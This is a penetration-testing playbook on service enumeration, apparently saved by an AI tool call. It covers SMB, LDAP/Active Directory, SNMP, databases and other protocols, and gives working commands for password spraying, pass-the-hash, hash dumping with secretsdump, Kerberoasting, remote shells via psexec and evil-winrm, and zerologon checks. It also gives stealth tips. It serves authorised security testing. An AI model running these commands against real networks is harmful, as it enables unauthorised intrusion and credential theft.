# Service Enumeration (Per-Protocol Playbook)

Once port scanning (`port-scanning.md`) reveals open ports, *service enumeration* squeezes every drop of intelligence from each protocol: users, shares, configs, versions, and misconfigurations that become the foothold. This is the per-port deep-dive. Organized by service, with the exact tools and flags practitioners use in 2025.

> **Tooling note:** **CrackMapExec is dead — use NetExec (`nxc`)**, its actively maintained successor. NetExec speaks SMB, LDAP, WinRM, RDP, MSSQL, SSH, FTP, VNC, NFS, and WMI from one binary, with BloodHound integration and far more modules. Every `crackmapexec` command below maps 1:1 to `nxc`.

---

## Service → Port Quick Map

| Port(s) | Service | Section |
|---------|---------|---------|
| 21 | FTP | [FTP](#ftp-enumeration-21) |
| 22 | SSH | [SSH](#ssh-enumeration-22) |
| 25/465/587 | SMTP | [SMTP](#smtp-enumeration) |
| 53 | DNS | see `dns-enumeration.md` |
| 88/389/636/3268 | Kerberos/LDAP | [LDAP/AD](#ldap--active-directory-enumeration) |
| 111/2049 | NFS | [NFS](#nfs-enumeration-1112049) |
| 139/445 | SMB | [SMB](#smb-enumeration) |
| 161 (UDP) | SNMP | [SNMP](#snmp-enumeration) |
| 1433/3306/5432/6379/27017 | Databases | [Databases](#database-enumeration) |
| 3389/5985-5986 | RDP/WinRM | [RDP/WinRM](#rdp--winrm) |

---

## SMB Enumeration

SMB (139/445) exposes shares, users, groups, password policy, and domain intel — the richest single protocol on Windows networks.

### Discovery & protocol/OS

```bash
naabu -list hosts.txt -p 139,445 -silent
nxc smb 10.0.0.0/24                                   # banner: hostname, domain, OS, signing
nmap -p139,445 --script smb-protocols,smb-os-discovery,smb2-security-mode 10.0.0.5
```

`nxc smb <target>` is the fastest first move — one line gives hostname, domain, OS build, SMB version, and **signing status** (signing:False = relay-able).

### NetExec (the workhorse)

```bash
# Null / guest / anonymous checks
nxc smb 10.0.0.5 -u '' -p ''                          # null session
nxc smb 10.0.0.5 -u 'guest' -p ''                     # guest
nxc smb 10.0.0.5 -u '' -p '' --shares                 # enumerate shares (read/write perms)

# Authenticated enumeration
nxc smb 10.0.0.5 -u user -p 'Pass123' --shares --users --groups --pass-pol --sessions
nxc smb 10.0.0.5 -u user -p 'Pass123' --rid-brute      # RID-cycle to dump domain users
nxc smb 10.0.0.5 -u user -p 'Pass123' -M spider_plus   # crawl readable shares for files

# Password spraying across a subnet (continue past hits)
nxc smb 10.0.0.0/24 -u users.txt -p 'Winter2025!' --continue-on-success

# Pass-the-Hash
nxc smb 10.0.0.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTHASH --shares
```

### smbclient / smbmap / rpcclient

```bash
smbclient -L //10.0.0.5 -N                             # list shares, no creds
smbclient //10.0.0.5/Share -U 'user%pass'              # interactive access
smbmap -H 10.0.0.5 -u user -p pass                     # share perms at a glance
smbmap -H 10.0.0.5 -u user -p pass -R Share$           # recursive listing
smbmap -H 10.0.0.5 -u user -p pass -x 'whoami'         # command exec (if admin)

rpcclient -U "" -N 10.0.0.5                            # null RPC
  > enumdomusers
  > enumdomgroups
  > querydominfo
  > getdompwinfo
  > netshareenumall
```

### Impacket (exec + creds + Kerberos)

```bash
psexec.py    domain/user:pass@10.0.0.5                 # SYSTEM shell (noisy)
wmiexec.py   domain/user:pass@10.0.0.5                 # semi-interactive, quieter
smbexec.py   user:pass@10.0.0.5
secretsdump.py user:pass@10.0.0.5                      # dump SAM/LSA/NTDS hashes
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request  # Kerberoast
GetNPUsers.py  domain/ -usersfile users.txt -format hashcat -no-pass  # AS-REP roast
```

### Vuln checks

```bash
nmap --script "smb-vuln-*" -p445 10.0.0.5             # MS17-010 (EternalBlue), etc.
nxc smb 10.0.0.5 -M zerologon                          # CVE-2020-1472
nxc smb 10.0.0.5 -M petitpotam                         # coercion
```

> **Misconfig hit-list:** null/guest sessions enabled, SMB signing disabled (relay), SMBv1 present (EternalBlue), world-readable shares (`Everyone`/`Authenticated Users`), creds in share files (`spider_plus`).

---

## LDAP & Active Directory Enumeration

LDAP (389/636/3268) over an AD domain is a near-complete map: users, groups, computers, ACLs, GPOs, delegation, and AD CS attack surface.

```bash
# Anonymous bind / naming context
ldapsearch -x -H ldap://10.0.0.5 -s base namingcontexts
ldapsearch -x -H ldap://10.0.0.5 -b "DC=corp,DC=local"        # dump if anon bind allowed

# NetExec LDAP — the powerhouse
nxc ldap 10.0.0.5 -u user -p pass --users --groups --computers
nxc ldap 10.0.0.5 -u user -p pass --asreproast asrep.txt       # AS-REP roastable users
nxc ldap 10.0.0.5 -u user -p pass --kerberoasting kerb.txt     # SPN accounts
nxc ldap 10.0.0.5 -u user -p pass --trusted-for-delegation     # delegation abuse
nxc ldap 10.0.0.5 -u user -p pass -M gmsa                      # GMSA passwords
nxc ldap 10.0.0.5 -u user -p pass -M adcs                      # AD CS templates (ESC*)
nxc ldap 10.0.0.5 -u user -p pass --bloodhound -c all --dns-server 10.0.0.5   # BH collection
```

`nxc ldap ... --bloodhound -c all` runs a full SharpHound-equivalent collection and drops BloodHound-ready JSON — feed it into BloodHound/BloodHound CE for ACL/path analysis.

```bash
# Standalone BloodHound collectors
bloodhound-python -u user -p pass -d corp.local -ns 10.0.0.5 -c all
windapsearch --dc-ip 10.0.0.5 -u user@corp.local -p pass --da   # quick domain-admins list
```

---

## SMTP Enumeration

SMTP (25/465/587) can leak valid usernames (VRFY/EXPN/RCPT) and open-relay misconfigs.

```bash
# Manual session
nc -nv 10.0.0.8 25
  EHLO x            # lists supported verbs
  VRFY root         # 252/250 = exists, 550 = no
  RCPT TO:<root@target>

# Automated user enumeration
smtp-user-enum -M VRFY -U users.txt -t 10.0.0.8
smtp-user-enum -M RCPT -D target.com -U users.txt -t 10.0.0.8   # RCPT is most reliable
nmap -p25 --script smtp-enum-users,smtp-commands,smtp-open-relay 10.0.0.8

# TLS / cipher posture on submission ports
nmap -p465,587 --script ssl-enum-ciphers 10.0.0.8
```

Behaviors: Postfix → `252` for valid users; Exchange usually rejects VRFY (use RCPT). Common usernames: `root, admin, administrator, postmaster, webmaster, info, support, sales, hr`.

---

## SNMP Enumeration

SNMP (161/UDP) with a guessed community string is a firehose of system intel — users, processes, software, routing/ARP tables, even device configs.

```bash
# Discover + brute community strings
sudo nmap -sU -p161 --open 10.0.0.0/24
onesixtyone -c communities.txt -i targets.txt           # fast community-string brute
# common strings: public, private, community, manager, cisco, secret

# Walk the tree
snmpwalk -v2c -c public 10.0.0.5                         # full MIB
snmpbulkwalk -v2c -c public 10.0.0.5 1.3.6.1.2.1.25.4.2.1.2   # bulk = faster
snmp-check 10.0.0.5 -c public                           # human-friendly summary
```

High-value OIDs:

| Intel | OID |
|-------|-----|
| System description | `1.3.6.1.2.1.1.1.0` |
| Running processes | `1.3.6.1.2.1.25.4.2.1.2` |
| Installed software | `1.3.6.1.2.1.25.6.3.1.2` |
| Listening TCP ports | `1.3.6.1.2.1.6.13.1.3` |
| Windows users | `1.3.6.1.4.1.77.1.2.25` |
| ARP table | `1.3.6.1.2.1.4.22.1.2` |
| Routing table | `1.3.6.1.2.1.4.21.1.1` |
| Cisco running-config | `1.3.6.1.4.1.9.2.1.55` |

> SNMPv1/v2c have *no encryption* — community string = password in cleartext. v3 adds auth/priv (still brute-forceable if weak). Default `public`/`private` strings remain extremely common on printers, switches, and IoT.

---

## FTP Enumeration (21)

```bash
nmap -p21 -sV --script ftp-anon,ftp-syst,ftp-bounce 10.0.0.5
nxc ftp 10.0.0.5 -u anonymous -p ''                     # anonymous login check
ftp 10.0.0.5     # login anonymous / anonymous, then: ls -la, get, put (test write!)
nxc ftp 10.0.0.0/24 -u users.txt -p passwords.txt       # cred spray
```

Check: anonymous read/write, writable webroot (upload → RCE), banner version → CVE (e.g., vsftpd 2.3.4 backdoor).

---

## SSH Enumeration (22)

```bash
nmap -p22 -sV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey 10.0.0.5
nxc ssh 10.0.0.5 -u users.txt -p passwords.txt          # cred spray
ssh-audit 10.0.0.5                                       # algorithm/version posture + CVEs
```

Note auth methods (`publickey` only vs `password`), banner version (libssh/OpenSSH CVEs), and weak KEX/cipher support. CVE-2024-6387 (regreSSHion) and username-enum CVEs are version-gated — version detection matters.

---

## NFS Enumeration (111/2049)

```bash
showmount -e 10.0.0.5                                    # list exported shares
nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs 10.0.0.5
mkdir /mnt/nfs && sudo mount -t nfs 10.0.0.5:/export /mnt/nfs -o nolock   # mount + read
```

World-exported shares (`*` in exports) often leak home dirs, backups, and SSH keys. `no_root_squash` exports enable privesc (write a SUID binary as root).

---

## Database Enumeration

```bash
# MSSQL (1433)
nxc mssql 10.0.0.5 -u sa -p '' --local-auth -x 'whoami'  # xp_cmdshell if sysadmin
nmap -p1433 --script ms-sql-info,ms-sql-empty-password 10.0.0.5

# MySQL (3306)
mysql -h 10.0.0.5 -u root -p''                            # blank-password root
nmap -p3306 --script mysql-info,mysql-empty-password,mysql-users 10.0.0.5

# PostgreSQL (5432)
psql -h 10.0.0.5 -U postgres                              # default creds
nmap -p5432 --script pgsql-brute 10.0.0.5

# Redis (6379) — frequently unauthenticated
redis-cli -h 10.0.0.5 INFO; redis-cli -h 10.0.0.5 KEYS '*'
nmap -p6379 --script redis-info 10.0.0.5                  # → RCE via module load / cron / SSH key write

# MongoDB (27017) — often no auth
mongosh "mongodb://10.0.0.5:27017" --eval 'db.adminCommand({listDatabases:1})'
nmap -p27017 --script mongodb-info,mongodb-databases 10.0.0.5

# Elasticsearch (9200)
curl -s http://10.0.0.5:9200/_cat/indices                 # open index list = data leak
```

> **Unauthenticated Redis/MongoDB/Elasticsearch** are perennial high-severity findings — exposed to the internet with no auth, they yield full data access (and Redis often full RCE). Always check these when the ports are open.

---

## RDP & WinRM

```bash
# RDP (3389)
nxc rdp 10.0.0.0/24 -u users.txt -p passwords.txt        # cred spray / NLA check
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption 10.0.0.5   # leaks hostname/domain

# WinRM (5985/5986) — lateral movement workhorse
nxc winrm 10.0.0.5 -u user -p pass                        # check exec rights
evil-winrm -i 10.0.0.5 -u user -p pass                    # interactive shell
```

`rdp-ntlm-info` leaks the target's NetBIOS/DNS name, domain, and OS build pre-auth — useful for naming-convention mapping.

---

## Cheatsheet

```bash
nxc smb 10.0.0.0/24                                       # SMB recon: OS, signing, domain
nxc smb 10.0.0.5 -u '' -p '' --shares                     # null-session shares
nxc smb DC -u u -p p --rid-brute                          # domain user list
nxc ldap DC -u u -p p --bloodhound -c all --dns-server DC # full AD collection
nxc ldap DC -u u -p p --kerberoasting kerb.txt            # SPN roast
smbmap -H 10.0.0.5 -u u -p p -R                           # recursive share read
smtp-user-enum -M RCPT -D target.com -U users.txt -t MX   # SMTP user enum
onesixtyone -c communities.txt -i targets.txt             # SNMP community brute
showmount -e 10.0.0.5                                      # NFS exports
redis-cli -h 10.0.0.5 INFO                                # unauth Redis check
```

---

## OPSEC & Pitfalls

- **`nxc` first** on any Windows host — one line of recon before anything noisy.
- **Password spraying** (`--continue-on-success`) over brute-forcing one account — avoids lockouts; spray 1 password across many users, wait for the lockout window.
- **Null/anonymous checks are free** — always try `-u '' -p ''` (SMB, LDAP, FTP) before authenticated work.
- **SNMP/SMTP are UDP/cleartext** — community strings and VRFY responses travel in the clear.
- **Unauth databases = instant high-sev** — Redis/Mongo/ES/Memcached exposed without auth.
- **Impacket `psexec` is loud** (creates a service); prefer `wmiexec`/`atexec` for stealth.
- **Account lockout** — know the domain lockout policy (`--pass-pol`) before spraying.

---

## References

- NetExec (NXC) — https://github.com/Pennyw0rth/NetExec
- NetExec Cheat Sheet (StationX, 2026) — https://www.stationx.net/netexec-cheat-sheet/
- Black Hills — Getting Started with NetExec — https://www.blackhillsinfosec.com/getting-started-with-netexec/
- AD LDAP Enumeration with NetExec — https://medium.com/@tareshsharma17/the-ultimate-guide-to-active-directory-ldap-enumeration-using-netexec-af7f24ec05ff
- Impacket — https://github.com/fortra/impacket
- HackTricks — Pentesting SMB / LDAP / SNMP / SMTP — https://book.hacktricks.xyz/network-services-pentesting
- BloodHound — https://github.com/SpecterOps/BloodHound
</content>
</invoke>
